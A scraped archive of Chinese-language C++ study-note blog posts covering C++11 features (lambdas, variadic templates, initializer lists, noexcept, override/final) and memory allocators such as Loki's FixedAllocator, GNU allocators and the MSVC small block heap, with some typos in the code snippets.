对于lambda，我们手上往往只有object，没有type。这是可以使用decltypeBecause you need the type of the lambda for the declaration of the set,decltype must be used ,which yields the type of a lambda object,such as cmp.Note that you also have to pass the lambda object to the constructor of coll;otherwise,coll would call the default constructor for the sorting criterion passed ,and by rule lambdas have no default constructor and no assignment operator.So,for a sorting criterion,a class defining the function objects might still be more intuitive. LambdasC++11 introduced lambdas,allowing the definition of inline functionality,which can used as a parameter or a local object.Lambdas change the way the C++ standard library is used.A lambda is a definition of functionality that can be defined inside statements and expressions.Thus,you can use a lambdas as an inline function.The minimal lambda function has no parameters and simply does something; 123[]&#123; std::cout &lt;&lt; \"hello lambda\" &lt;&lt; std::endl;&#125;; You can call it directly: 123[]&#123; std::cout &lt;&lt; \"hello lambda\" &lt;&lt; std::endl;&#125;(); or pass it to objects to get called: 1234Auto l = []&#123; std::cout &lt;&lt; \"hello lambda\" &lt;&lt; std::endl;&#125;;l(); you can specify a capture to access data of outer scope that is not passed as an argument:[=]means that the outer scope is passed to the lambda by value.[&amp;]means that the outer scope is passed to the lambda by reference.Ex: 123int x = 0;int y = 41;auto q = [x,&amp;y] &#123;...&#125;; [=,&amp;y]to pass y by reference and all other objects by value.Objects are passed by value,but inside the function object defined by the lambda,you have write access to the passed value. 12345678int id = 0;auto f = [id]() mutable&#123; std::cout &lt;&lt; \"id:\" &lt;&lt; id &lt;&lt; std::endl; ++id;//如果没有写mutable，这个还有效吗?&#125;;id = 42;f();f();f();std::cout &lt;&lt; if &lt;&lt;std::endl; the type of a lambda is an anonymous function object(or functor) 123456789101112class Functor&#123;public: void operator()() &#123; std::cout &lt;&lt; \"id:\" &lt;&lt; id &lt;&lt;std::endl; ++id; &#125;private: int id;&#125;;Functor f; pass by value12345678int id = 0;auto f = [id]() mutable&#123; std::cout &lt;&lt; \"id:\" &lt;&lt; id &lt;&lt; std::endl; ++id;&#125;;id = 42;f();f();f();std::cout &lt;&lt; if &lt;&lt;std::endl; 结果是： 1234id:0id:1id:242 pass by reference12345678int id = 0;auto f = [&amp;id]() mutable&#123; std::cout &lt;&lt; \"id:\" &lt;&lt; id &lt;&lt; std::endl; ++id;&#125;;id = 42;f();f();f();std::cout &lt;&lt; if &lt;&lt;std::endl; 结果是： 1234id:42id:43id:4445 No mutable12345678int id = 0;auto f = [id]() &#123; std::cout &lt;&lt; \"id:\" &lt;&lt; id &lt;&lt; std::endl; ++id;//ERROR&#125;;id = 42;f();f();f();std::cout &lt;&lt; if &lt;&lt;std::endl; 结果是：ERROR increment of read-only variable ‘id’ 可以申明变量，可以返回变量12345auto f = [id]()mutable&#123; static int x = 5; int y = 6; return id;&#125;; 再看Variadic Template重写printf()123456789101112131415161718192021222324template&lt;typename T,typename... Args&gt;void printf(const char* s,T value,Args... args)&#123; while(*s) &#123; if(*s == '%' &amp;&amp; *(++s) != '%') &#123; std::cout &lt;&lt; value; printf(++s, args...); return; &#125; std::cout &lt;&lt; *s++; &#125; throw std::logic_error(\"extra arguments provided to printf\");&#125;void printf(const char *s)&#123; while(*s) &#123; if(*s == '%'&amp;&amp;*(++s) != '%') throw std::runtime_error(\"invaild format string: missing arguments\"); std::cout &lt;&lt; *s++; &#125;&#125; 实现max接受任意个数若参数type都一样，就无需调用variadic templates,使用initializer_list就足够了。 123456789101112131415161718192021222324252627282930313233343536373839404142template&lt;typename _ForwardIterator, typename _Compare&gt;_ForwardIterator__max_element(_ForwardIterator __first, _ForwardIterator __last, _Compare _comp)&#123; if(__first == __last) return __first; _ForwardIterator __result = __first; while(++__first != __last) if(__comp(__result, __first)) __result = __first; return __result;&#125;template&lt;typename _ForwardIterator&gt;inline _ForwardIteratormax_element(_ForwardIterator __first, _ForwardIterator __last)&#123; return __max_element(__first,__last, __iter_less_iter());&#125; template&lt;typename _Tp&gt;inline _Tpmax(initializer_list&lt;_Tp&gt; __l)&#123; return *max_element(_l.begin(),__l.end());&#125;inline _Iter_less_iter __iter_less_iter()&#123; return _Iter_less_iter();&#125;struct _Iter_less_iter&#123; template&lt;typename _Iterator1,typename _Iterator2&gt; bool operator()(_Iterator1 __it1,_Iterator2 __it2) const &#123; return *__it1 &lt; *__it2; &#125;&#125;; 若参数type不同的话，使用variadic templates1234567int mymax(int n)&#123; return n; &#125;template &lt;typename... Args&gt;int mymax(int n, Args... args)&#123; return std::max(n, mymax(args...));&#125; 处理first和last元素12345678910111213141516171819202122template&lt;typename... Args&gt;ostream&amp; operator&lt;&lt;(ostream&amp; os, const tuple&lt;Args...&gt;&amp; t)&#123; os &lt;&lt; \"[\"; PRINT_TUPLE&lt;0,sizeof...(Args),Args...&gt;::print(os,t); return os &lt;&lt; \"]\";&#125;template&lt;int IDX,int MAX, typename... Args&gt;struct PRINT_TUPLE&#123; static void print (ostream&amp; os,const tuple &lt;Args...&gt;&amp; t) &#123; os &lt;&lt; get&lt;IDX&gt;(t) &lt;&lt; (IDX + 1==MAX?\"\":\",\"); PRINT_TUPLE&lt;IDX+1, MAX, Args...&gt;::print(os, t); &#125;&#125;;template&lt;int MAX, typename...Args&gt;struct PRINT_TUPLE&lt;MAX, MAX, Args...&gt;&#123; static void print (std::ostream&amp; os, const tuple&lt;Args...&gt;&amp; t) &#123;&#125;&#125;; 测试： 1cout &lt;&lt; make_tuple(7.5, string(\"hello\"),bitset&lt;16&gt;(377), 42); 结果： 1[7.5,hello,0000000101111001,42] 递归继承recursive inheritance参看第一讲但是里面有一行在这里就要变为 12typename Head::type head() &#123; return m_head;&#125; Head head() &#123; return m_head; &#125;//至此这就完美了 递归复合recursive composition1234567891011121314151617template &lt;typename... values&gt; class tuple;template &lt;&gt; class tuple&lt;&gt; &#123;&#125;;//结束边界template&lt;typename Head,typename... Tail&gt;class tuple &lt;Head, Tail...&gt; :private tuple &lt;Tail...&gt;&#123; typedef tuple &lt;Tail...&gt; inherited;public: tuple() &#123;&#125; tuple(Head v, Tail... vtail) :m_head(v), m_tail(vtail...) &#123;&#125; typename Head::type head() &#123; return m_head; &#125; inherited&amp; tail() &#123; return m_tail; &#125;protected:] inherited m_tail; Head m_head;&#125;;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"cpp第二版","slug":"cpp第二版","permalink":"http://coordinate.wang/tags/cpp第二版/"}]},{"title":"cpp2.0新特性(1)","slug":"2017-04-13-cpp2.0新特性1","date":"2017-04-12T16:00:00.000Z","updated":"2018-02-18T03:29:06.137Z","comments":true,"path":"2017/04/13/2017-04-13-cpp2.0新特性1/","link":"","permalink":"http://coordinate.wang/2017/04/13/2017-04-13-cpp2.0新特性1/","excerpt":"","text":"新增加的头文件1234567#include &lt;type_traits&gt;#include &lt;unordered_set&gt;#include &lt;forward_list&gt;#include &lt;array&gt;#include &lt;tuple&gt;#include &lt;regex&gt;#include &lt;thread&gt; Variadic Templates12345678910void print()&#123;//处理最后情况&#125;template &lt;typename T,typename... Types&gt;void print(const T&amp; first, const Types&amp;... args)&#123; cout &lt;&lt; first &lt;&lt; endl;//递归调用recursive print(args...);&#125; …就是所谓的pack用于template parameters ，就是template parameters pack用于function parameter types，就是function parameters types pack用于function parameters ，就是function parameters packsizeof…(args) yields the number of arguments 12345678910111213141516template &lt;typename... values&gt; class tuple;template &lt;&gt; class tuple&lt;&gt; &#123;&#125;;//结束边界template&lt;typename Head,typename... Tail&gt;class tuple &lt;Head, Tail...&gt; :private tuple &lt;Tail...&gt;&#123; typedef tuple &lt;Tail...&gt; inherited;public: tuple() &#123;&#125; tuple(Head v, Tail... vtail) :m_head(v), inherited(vtail...) &#123;&#125; typename Head::type head() &#123; return m_head; &#125; inherited&amp; tail() &#123; return *this; &#125;protected: Head m_head;&#125;; Spaces in template expressions12vector&lt;list&lt;int&gt; &gt;;//ok in each c++ versionvector&lt;list&lt;int&gt;&gt;;//ok in c++ 11 nullptr and std::nullptr_tC++11 lets you use nullptr instead of 0 or NULL to specify that a pointer refers to no value.This new feature especially helps to avoid mistakes that occurred when a null ointer was interpreted as an integral value. 12345void f(int);void f(void*)f(NULL);//valls f(int) if NULL is 0,ambiguous otherwisef(nullptr); //call f(void*)nullptr is a new keywords Automatic type deduction with auto With c++11,you can declare a variable or an object without specifying its specific type by using auto. 123auto i = 42;double f();auto d = f(); using auto is especially useful where the type is a pretty long and/or complicated expression. 12vector&lt;string&gt; v;auto pos = v.begin(); //pos has type vector&lt;string&gt;::iterator Uniform initializationBefore c++11,programmers,especially novices,could easily become confused by the question of how to initialize a variable or an object.Initialization could happen parentheses, braces,and/or assignment opretators.For this reason ,c++11 introduces the concept of uniform initialization ,which means that for any initialization ,you can use one common syntax.This syntax uses braces, so the following is possible now; 123int values[]&#123; 1,2,3 &#125;;vector&lt;int&gt; v&#123; 1,2,3 &#125;;complex&lt;double&gt; c&#123; 4.0,3.0 &#125;;//背后有个array&lt;double,2&gt; 编译器看到{1,2…}便做出一个initializer_list，它关联至一个array&lt;T,n&gt;。调用函数时该array内的元素可被编译器逐一分解传给函数。但若函数参数是个initializer_list，调用者却不能给予数个T参数然后以为他们会被自动转为一个initializer_list传入。 Initializer listsAn initializer list forces so-called value initialization ,which means that even local variables of fundamental data types,which usually have an undefined initial value,are initialized by zero 1234int i; //i has undefined valueint j&#123;&#125;;//j is initialized by 0int *p;//i has undefined valueint *q&#123;&#125;;//q is initialized by nullptr Note,however,that narrowing initializations –those that reduce precision or where the supplied value gets modified – are not possible with braces. 1234int x1(5.3);//x1 to 5int x2 = 5.3;//x2 to 5int x3&#123;5.3&#125;;//errorint x4 = &#123;5.3&#125;;//error To support the concept of initializer lists for user-defined types,c++11 provides the class template std::initializer_list&lt;&gt; .It can be used to support initializations by a list of values or in any place where you want to process just a list of values. 12345678void print(std::initializer_list&lt;int&gt; vals)&#123; for (auto p = vals.begin(); p != vals.end(); ++p) &#123; std::cout &lt;&lt; *p &lt;&lt; std::endl; &#125;&#125;print(&#123; 1,2,3 &#125;);//与前面不同的是这里面的类型必须相同 when there are constructors for both a specific number of arguments and an initializer list, the version with the initializer list is preferred. 12345678910111213141516171819class P&#123;public: P(int a, int b) &#123; cout &lt;&lt; \"fjdsjf\" &lt;&lt; endl; &#125; P(initializer_list&lt;int&gt; initlist) &#123; for (auto i : initlist) &#123; cout &lt;&lt; i &lt;&lt; endl; &#125; &#125;&#125;;P p(77, 5); //P(int,int)P q&#123; 77,5 &#125;;//P(initializer_list&lt;&gt;)P r&#123; 77,5,42 &#125;;//P(initializer_list&lt;&gt;)P s = &#123; 77,5 &#125;;//P(initializer_list&lt;&gt;) Without the constructor for the initializer list, the constructor taking two ints would be called to initialize q and s,while the initialization of r would be invalid.Initializer_list objects are automatically constructed as if an array of elements of type T was allocated ,with each of the elements in the list being copy-initialized to its corresponding element in the array,using any necessary non-narrowing implicit conversions.The initializer_list object refers to the element of this array without containing them:copying an initializer_list object produces another object referring to the same underlying elements, not to new copies of them (reference semantics).The lifetime of this temporary array is the same as the initializer_list object. Explicit for ctors taking more than one argument12345678910class P&#123;public: P(int a, int b) &#123; cout &lt;&lt; a &lt;&lt; \" \" &lt;&lt; b &lt;&lt; endl;&#125; explicit P(int a, int b, int c) &#123;&#125;&#125;;P y = (1, 2);//errorP z = (1, 2, 3);//errorP v = &#123; 1,2 &#125;;//okP w = &#123; 1,2,3 &#125;;//error 关于上面()这样做的错误原因，我后来想了一下，（）内取得是“，”运算符的结果，将这个结果初始化y，但是没有单个参数的构造函数，所以出现了“初始化: 无法从“int”转换为“P”，此时如果将第一个构造函数改为 1P(int a, int b = 0) &#123;&#125; 编译果然通过了，结果和预想的一样 Range-based for statement1234for (decl : coll)&#123; statement;&#125; No explicit type conversions are possible when elements are initialized as decl inside the for loop.Thus ,the following does not compile: 12345678910class C&#123;public: explicit C(const std::string&amp; s);&#125;;std::vector&lt;std::string&gt; vs;for (const C&amp; elem : vs) //ERROR,no conversion from string to C defined &#123; std::cout &lt;&lt; elem &lt;&lt; std::endl;&#125; =default ,=delete如果你自行定义了一个ctor，那么编译器就不会再给你一个default ctor。如果你强行加上=default，就可以重新获得并使用default ctor。 123456789101112131415class Zoo&#123;public: Zoo(int i1,int i2) : d1(i1),d2(i2); Zoo(const Zoo&amp;) = delete;//表示我不使用这个构造函数，default ctor也不会使用// Zoo(const Zoo&amp;) = default;//ERROR,’Zoo(const Zoo&amp;)’cannot be overload//对于copy assignment也是类似 的 Zoo(Zoo&amp;&amp;) = default;//表示使用编译器给我的默认构造函数 Zoo&amp; operator=(const Zoo&amp;) = default; Zoo&amp; operator=(const Zoo&amp;&amp;) = delete; virtual ~Zoo();private: int d1, d2;&#125;; =default用于big-5之外没有意义，编译会报错=delete可以用在任何函数上default ctor和dtor主要是给编译器放置如唤起base classed以及non-static members的ctors和dtors，这个在effective c++中有所提及。对于何种类需要自己写big-3呢？如果这个类内部有pointer member的话，大多数情况下是需要自己写的，如果没有pointer member的话，基本可以使用default。 Alias template(template typedef)12template &lt;typename T&gt;using Vec = std::vector&lt;T, MyAlloc&lt;T&gt;&gt;; the term 1Vec&lt;int&gt; coll; is equivalent to 1std::vector&lt;int, MyAlloc&lt;int&gt;&gt; coll; It is not possible to partially or explicitly specialize an alias template.难道只是为了少敲几个代码吗？看这个例子：//函数功能：可以传入不同容器进行测试 1234567891011template&lt;typename Container&gt;void test_moveable(Container cntr)&#123; typedef typename iterator_traits&lt;typename Container::iterator&gt;::value_type T; for (long i = 0; i &lt; SIZE; ++i) c.insert(c.end(), T()); output_static_data(*(c.begin())); Container&lt;T&gt; c1(c); Container&lt;T&gt; c2(std::move(c)); c1.swap(c2);&#125; 要注意的是container里面的类型也是不定的所以就用到了以下方法：template template parameter 1234567891011121314151617template&lt;typename T,template &lt;class T&gt; class Container&gt;class XCLs&#123;public: XCLs() &#123; for (long i = 0; i &lt; SIZE; ++i) c.insert(c.end(), T()); output_static_data(T()); Container&lt;T&gt; c1(c); Container&lt;T&gt; c2(std::move(c)); c1.swap(c2); &#125;private: Container&lt;T&gt; c;&#125;;XCLs&lt;MyString,vector&gt; c1; 但是这里报错了ERROR type/value mismatch at argument 2 in template parameter list for ‘template&lt;class T,template class Container&gt; class XCLs’原因在于 12template&lt;typename _Tp,typename _Alloc = std::allocator&lt;_Tp&gt;&gt;class vector: protected _Vector_base&lt;_Tp,_Alloc&gt; 虽然第二个参数有默认值但是Alias template are never deduced by template argument deduction when deducing a template template parameter最终的解决法，这样使用这个类 1234template&lt;typename T&gt;using Vec = vector&lt;T, allocator&lt;T&gt;&gt;;//上面的东西是不可以写在函数内的XCLs&lt;MyString,Vec&gt; c1; Type alias(similar to typedef)12//typedef void(*func)(int,int);using func = void(*)(int,int); There is no difference between a type alias declaration and typedef declaration.This declaration many appear in block scope,class scope or namespace scope. noexcept12//void foo() noexcept(true);void foo() noexcept; Declares that foo() won’t throw.If an exception is not handled locally inside foo()-thus,if foo() throws – the program is terminated ,calling std::terminate(),which by default calls std::abort().由于noexcept不需要stack unwinding ，程序员从今开始可以表现“绝不抛出”而不需要额外开销。c++11开始不再鼓励使用异常明细。You can even specify a condition undef which a function throws no exception.For example,for any type Type,the alobal swap() usually is defined as follows: 1234void swap(Type &amp;x, Type&amp; y) noexcept(noexcept(x.wap(y)))&#123; x.swap(y);&#125; Here,inside noexception(…),you can specify a Boolean condition under which no thrown :Specifying noexcept without condition is a short form of specifying noexcept(true).You need to inform C++(specifivally std::vector)that your move constructor and destructor does not throw.Then the move constructor will be called when the vector frows.If the constructor is not noexcept,std::vector can’t use it,since then it can’t ensure the exception guarantees demanded by the standard.Growable containers(会发生memory reallocation) 只有两种:vector 和 deque 12345678class MyString&#123;public: MyString(MyString &amp;&amp;str)noexcept : _data(str._data), _len(str._len) &#123;...&#125;private:&#125;; override1234567891011struct Base&#123; virtual void vfunc(float) &#123;&#125;&#125;;struct Derived : Base&#123; //ERROR 'virtual void Derived::vfunc(in)' marked override,but does not override virtual void vfunc(int) override &#123;&#125; virtual void vfunc(float) override &#123;&#125;&#125;; final12345678910111213struct Base final &#123;&#125;;//ERROR cannot derive from 'final' base 'Base' in derived type 'Derived'struct Derived : Base &#123;&#125;;struct Base2&#123; virtual void f() final;&#125;;struct Derived2 : Base2&#123; //ERROR overriding final function void f();&#125;;","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"cpp第二版","slug":"cpp第二版","permalink":"http://coordinate.wang/tags/cpp第二版/"}]},{"title":"loki::allocator","slug":"2017-04-12-loki's allocator","date":"2017-04-11T16:00:00.000Z","updated":"2018-02-18T03:29:06.106Z","comments":true,"path":"2017/04/12/2017-04-12-loki's allocator/","link":"","permalink":"http://coordinate.wang/2017/04/12/2017-04-12-loki's allocator/","excerpt":"","text":"Chunk123pData_: unsigned char*firstAvailableBlock_: unsigned char//第一个可用的编号blocksAvailable_: unsigned char//剩余可用的数目 123456789101112131415161718192021222324252627282930313233343536void FixedAllocator::Chunk::Init(std::size_t blockSize,unsigned char blocks)&#123; pData = new unsigned char[blockSize * blocks]; Reset(blockSize, blocks);&#125;void FixedAllocator::Chunk::Reset(std::size_t blockSize,unsigned char blocks)&#123; firstAvailableBlock_ = 0; blocksAvailable_ = blocks; unsigned char i = 0; unsigned char* p = pData_; for(; i!=blocks; p+=blockSize) *p =++i;&#125;void FixedAllocator::Chunk::Release()&#123; delete[] pData;&#125;void FixedAllocator::Chunk::Allocate(std::size_t blockSize)&#123; if(!blocksAvailable_) return 0; unsigned char* pResult = pData_ + (firstAvailableBlock_ * blockSize); firstAvailableBlock_ = *pResult; --blocksAvailable_; return pResult;&#125;void FixedAllocator::Chunk::Deallocate(void* p,std::size_t blockSize)&#123; unsigned char * toRelease = static_cast&lt;unsigned char*&gt;(p); *toRelease = firstAvailableBlock_; firstAvailableBlock_ = static_cast&lt;unsigned char&gt;( (toRelease - pData_)/blockSize); ++blocksAvailable_; &#125; FixedAllocator123chunks_:vector&lt;Chunk&gt;allocChunk_: Chunk*deallocChunk_: Chunk* 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798void *FixedAllocator::Allocate()&#123; if(allocChunk == 0 || allocChunk_-&gt;blocksAvailable_ == 0) &#123; Chunks::iterator i = chunks_.begin(); for(;; ++i) &#123; if(i == chunks_.end()) &#123; chunks_.push_back(Chunk()); Chunk&amp; newChunk = chunks_.back(); newChunk.Init(blockSize_, numBlocks_); allocChunk_ = &amp;newChunk;//指向上次给出去的chunk deallocChunk_ = &amp;chunks_.front();//指向上一次的回收 break; &#125; if(i-&gt;blocksAvailable_&gt; 0) &#123; allocChunk_ = &amp;*i; break; &#125; &#125; &#125; return allocChunk_-&gt;Allocate(blockSize_);&#125;void FixedAllocator::Deallocate(void *p)&#123; deallocChunk_ = VicinityFind(p); DoDealllocate(p);&#125;FixedAllocator::Chunk* FixedAllocator::VicinityFind(void *p)&#123; const std::size_t chunkLength = numBlocks_ * blockSize_; Chunk* lo = deallocChunk_; Chunk* hi = deallocChunk_ + 1; Chunk* loBound = &amp;chunks_.front(); Chunk* hiBound = &amp;chunks_.back() + 1; for(;;) &#123; if(lo) &#123; if(p &gt;= lo-&gt;pData_ &amp;&amp; p&lt; lo-&gt;pData_ + chunkLength) &#123; return lo; &#125; if(lo == loBound) lo = 0; else --lo; &#125; if(hi) &#123; if(p &gt;= hi-&gt;pData_&amp;&amp; p &lt;hi-&gt;pData_ + chunkLength) &#123; return hi; &#125; if( ++ hi == hiBound) hi = 0; &#125; &#125; return 0;&#125;void FixedAllocator::DoDeallocate(void *p)&#123; deallocChunk_-&gt;Deallocate(p, blockSize_);//是否等于开始的登记值 if(deallocChunk_-&gt;blocksAvailable == numBlocks) &#123; Chunk&amp; lastChunk == chunks_.back();//这里的做法与vc SBH defer类似//__sbh_pHeaderDefer是一个指针，指向一个全回收group所属的Header。这个group原//本应被释放，但暂时保留。当再有第二个全回收group出现时，SBH才释放Defer //group，并将新出现的全回收group设为defer。如果尚未出现第二个group而又从Defer //group取出block完成分配，Defer指针会被取消(设为NULL);//__sbh_indGroupDefer是个索引，指出Region中哪个group是Defer。 if(&amp;lastChunk == deallocChunk_) &#123; if(chunks_.size() &gt;1 &amp;&amp; deallocChunk_[-1].blocksAvailable_ == numBlocks) &#123; lastChunk.Release(); chunks_.pop_back(); allocChunk_ = deallocChunk_ = &amp;chunks_.front(); &#125; return; &#125; if(lastChunk.blocksAvailable == numBlocks) &#123; lastChunk.Release(); chunks_.pop_back(); allocChunk_ = deallocChunk_; &#125; else &#123; std::swap(*deallocChunk_, lastChunk); allocChunk_ = &amp;chunks_.back(); &#125; &#125;&#125; SmallObjAllocator12345pool_: vector&lt;FixedAllocator&gt;pLastAlloc: FixedAllocatorpLastDealloc: FixedAllocatorchunkSize: size_tmaxObjectSize: size_t","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"other issues","slug":"2017-04-12-other issues","date":"2017-04-11T16:00:00.000Z","updated":"2018-02-18T03:29:06.121Z","comments":true,"path":"2017/04/12/2017-04-12-other issues/","link":"","permalink":"http://coordinate.wang/2017/04/12/2017-04-12-other issues/","excerpt":"","text":"当将元素加入容器中，容器必须分配更多的内存以足够保存这些元素，于是他们向他的模板参数allocator发出申请，该模板参数往往被另一个名为 allocator_type。甚至将chars添加到string class也是如此，因为string也算是一个正规的STL容器。每个元素类型为T的容器的Allocator模板默认为allocator。其接口只有大约20个public申明，包括嵌套的typedefs和成员函数。最重要的两个成员函数是： 12T* allocate(size_type n, const void* hint = 0);Void deallocate(T* p, size_type n); N指的是客户申请的元素个数，不是指空间总量。这些空间是通过调用::operator new获得，但何时需要并无具体指定。 最容易满足需求的做法就是每当容器需要内存就调用operator new，每当容器释放内存就调用operator delete。这种做法比起分配大块内存并缓存然后小块小块的使用当然较慢，优势则是可以在极大范围的硬件和操作系统有效运作。 1__gnu_cxx::new_allocator 实现出简洁的operator new 和operator delete。 1__gnu_cxx::malloc_allocator 实现上例唯一不同的是，它使用c函数std::malloc和std::free 另外一种做法就是使用智能型allocator，将分配所得的内存加以缓存。这种额外机制可以数种形式呈现：可以是个bitmap index，用以索引至一个以2的指数倍成长的篮子。也可以是个相较之下比较简易的fixed-size pooling cache这里所说的cache被程序内的所有容器共享，而operators new和operator delete不经常被调用，这可带来速度上的优势。使用这个技巧的allocators包括： 1__gnu_cxx::bitmap_allocator 一个高效能的allocator，使用bit-map追踪被使用和未使用的内存块。 12__gnu_cxx::pool_allocator__gnu_cxx::__mt_alloc Class allocator 只拥有typedef,constructor,和rebind等成员。它继承自一个high-speed extension allocators。也因此，所有分配器和归还都取决于该base class，而这个base class也许是终端用户无法碰触和操控的。很难挑选出某个分配策略说他可以提供最大共同利益而不至于令某些行为过度优势。事实上，就算要挑选何种典型动作以测量速度，都是一种困难。GNU C++提供三项综合测试用以C++allocators之间的速度比较：Insertion进过多次iterations后各种STL容器将拥有某个极大量。分别测试sequence和associative容器。多线程环境中的insertion and erasure 。这个测试展示allocator归还内存，测量线程之间对内存的竞争。A threaded producer/consumer model分别测试sequence和associative容器。 另外两个智能allocator：gnu_cxx::debug_allocator这个是一个外覆器(wrapper)，可包含于任何allocator之上。他把客户的申请量添加一些，然后由allocator回应，并以那个一小块额外内存放置size信息。一旦deallocate()收到一个pointer，就会检查size并以assert()保证吻合。 gnu_cxx::array_allocator允许分配一个已知固定大小的内存块，内存来自std::array objects。用上这个allocator，大小固定的容器就无需在调用::operator new 和::operator delete。这就允许我们使用STL abstractions而无需再运行期添加额外开销。甚至在program startup情况下也可使用。注意他是静态的，所以他不需要调用delete。 Array allocator12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970//array内的第二个参数表示array的大小template&lt;typename _Tp,typename _Array = std::tr1::array&lt;_Tp,1&gt;&gt;class array_allocator:public array_allocator_base&lt;_Tp&gt;&#123;public: typedef size_t size_type; typedef _Tp value_type; typedef _Array array_type; ...private: array_type* _M_array; size_type _M_used;public: array_allocator(array_type* __array = NULL)throw() :_M_array(__array), _M_used(size_type())&#123;&#125; ... pointer allocate(size_type __n,const void* =0) &#123; if(_M_array == 0|| _M_used + __n&gt;_M_array &gt; size()) std::__throw_bad_alloc(); pointer __ret = _M_array-&gt;begin() + _M_used(); _M_used += __n; return __ret; &#125;&#125;;debug_allocatortemplate&lt;typename _Alloc&gt;class debug_allocator&#123;...private: size_type _M_extra;//额外的空间，记录整个区块的大小 _Alloc _M_allocator; size_type _S_extra() &#123; const size_t __obj_size = sizeof(value_type); return (sizeof(size_type) + __obj_size - 1)/__obj_size; &#125;public: debug_allocator(const _Alloc&amp; __a) :_M_allocator(__a), _M_extra(_S_extra())&#123;&#125; pointer allocate(size_type __n) &#123; pointer __res = _M_allocator.allocate(__n + __m_extra); size_type *__ps = reinterpret_cast&lt;size_type*&gt;(__res); *__ps = __n; return __res + _M_extra; &#125; void deallocate(pointer __p,size_type __n) &#123; using std::__throw_runtine_error; if(__p) &#123; pointer __real_p = __p + _m_extra; if(*reinterpret_cast&lt;size_type*&gt;(__real_p) != __n) __throw_runtime_error (\"debug_allocator::deallocate wrong size\"); _M_allocator.deallocate(__ + _M_extra); &#125; else &#123; __throw_runtime_error (\"debug_allocator::deallocate wrong size\"); &#125; &#125;&#125;; bitmap_allocator1234567891011121314151617181920212223242526272829template&lt;typename _Tp&gt;class bitmap_allocator:private free_list&#123;public: pointer allocate(size_type __n) &#123; if(__n &gt; this-&gt;max_size()) std::__throw_bad_alloc(); if(__builtin_expect(__n == 1,true)) return this-&gt;_M_allocate_single_object(); else &#123; const size_type __b = __n * sizeof(value_type); return reinterpret_cast&lt;pointer&gt;(::operator new(__b)); &#125; &#125; void deallocate(pointer __p,size_type __n)throw() &#123; if(__builtin_expect(__p !=0,true) &#123; if(__builtin_expect(__n == 1,tue)) &#123; this-&gt;_M_delaoocate_single_object(__p); &#125; else ::operator delete(_p); &#125; &#125;&#125;; Vector的元素排列将以super block size为依据，新进者若大于最末者，便直接delete新进者，否则delete最末者后再insert新进者，若没有到达64则insert到适当位置。","categories":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/categories/cpp/"}],"tags":[{"name":"cpp","slug":"cpp","permalink":"http://coordinate.wang/tags/cpp/"},{"name":"stl","slug":"stl","permalink":"http://coordinate.wang/tags/stl/"}]},{"title":"malloc/free","slug":"2017-04-11-malloc and free","date":"2017-04-10T16:00:00.000Z","updated":"2018-02-18T03:29:06.106Z","comments":true,"path":"2017/04/11/2017-04-11-malloc and free/","link":"","permalink":"http://coordinate.wang/2017/04/11/2017-04-11-malloc and free/","excerpt":"","text":"SBH(small block heap)_heap_init() 和__sbh_heap_init()CRT为自己建立一个__crtheap，然后从中配置SBH所需的headers，regions作为管理用。 123456789101112131415161718192021222324252627282930int _cdecl_heap_init(int mtflag)&#123; if(( _crtheap = HeapCreate( mtflag?0: HEAP_NO_SERIALIZE, BYTES_PER_PAGE, 0 )) == NULL) &#123; return 0; &#125; if( __sbh_heap_init() == 0) &#123; HeapDestory(_crtheap); &#125; return 1;&#125;#define nNoMansLandSize 4typedef struct _CrtMemBlockHeader&#123; struct _CrtMemBlockHeader *pBlockHeaderNext; struct _CrtMemBlockHeader *pBlockHeaderPrev; char *szFilename;//指向的文件名ioinit.c int nLine;//上面文件的第几行,81行 size_t nDataSize;//客户要的内存大小 int nBlockUse;//memory block long IRequest; unsigned char gap[nNoMansLandSize]; /*followed by: *unsigned char data[nDataSize]; *unsigned char anothergap[nNoMansLandSize]; */&#125;_CrtMemBlockHeader; 至此我们终于知道了，在debug模式下，分配的内存块中多出来的部分 关于第一块内存的分配123456789101112131415161718192021222324typedef struct tagRegion&#123; int indGroupUse;//0xffffffff，用于分割 char cntRegionSize[64]; BITVEC bitvGroupHi[32]; BITVEC bitvGroupLo[32]; struct tagGroup grpHeadList[32];&#125;REGION, *PREGION;typedef struct tagGroup&#123; int cntEntries; //记录分配次数，每分配一次加一，回收减一 struct tagListHead listHead[64];&#125;GROUP, *PGROUP;typedef struct tagListHead&#123; struct tagEntry *pEntryNext; struct tagEntry *pEntryPrev;&#125;LISTHEAD, *PLISTHEAD;typedef struct tagEntry&#123; int sizeFront; struct tagEntry *pEntryNext; struct tagEntry *pEntryPrev;&#125;ENTRY, *PENTRY; 归还操作系统sbh_pHeaderDefer是一个指针，指向一个全回收group所属的Header。这个group原本应被释放，但暂时保留。当再有第二个全回收group出现时，SBH才释放Defer group，并将新出现的全回收group设为defer。如果尚未出现第二个group而又从Defer group取出block完成分配，Defer指针会被取消(设为NULL); sbh_indGroupDefer是个索引，指出Region中哪个group是Defer。 1234567891011int __cdecl__sbh_heap_init(void)&#123; if(! (__sbh_pHeaderList = HeapAlloc(crtheap,0,16*sizeof(HEADER))) return FALSE; __sbh_pHeaderScan = __sbh_pHeaderList; __sbh_pHeaderDefer = NULL; __sbh_cntHeaderList = 0; __sbh_sizeHeaderList = 16; return 